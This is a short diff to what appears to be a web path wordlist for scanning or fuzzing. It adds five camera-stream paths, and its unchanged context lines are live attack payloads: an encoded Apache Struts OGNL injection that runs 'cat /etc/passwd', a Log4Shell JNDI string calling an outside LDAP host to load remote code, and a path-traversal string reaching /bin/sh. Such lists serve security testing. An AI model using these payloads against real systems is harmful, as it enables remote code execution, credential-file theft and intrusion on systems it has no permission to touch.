@@ -1,3 +1,8 @@
+live
+live/h264
+live/h264/ch1
+live/h264/ch2
+live/mjpeg
 $%7B%28%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue,%23a%3D@java.lang.Runtime@getRuntime%28%29.exec%28%27cat%20/etc/passwd%27%29.getInputStream%28%29,%23b%3Dnew%20java.io.InputStreamReader%28%23a%29,%23c%3Dnew%20%20java.io.BufferedReader%28%23b%29,%23d%3Dnew%20char%5B51020%5D,%23c.read%28%23d%29,%23sbtest%3D@org.apache.struts2.ServletActionContext@getResponse%28%29.getWriter%28%29,%23sbtest.println%28%23d%29,%23sbtest.close%28%29%29%7D/actionChain1.action
 $%7Bjndi:ldap://115.28.134.231:1389/Exploit%7D
 .%0D./.%0D./.%0D./.%0D./bin/sh
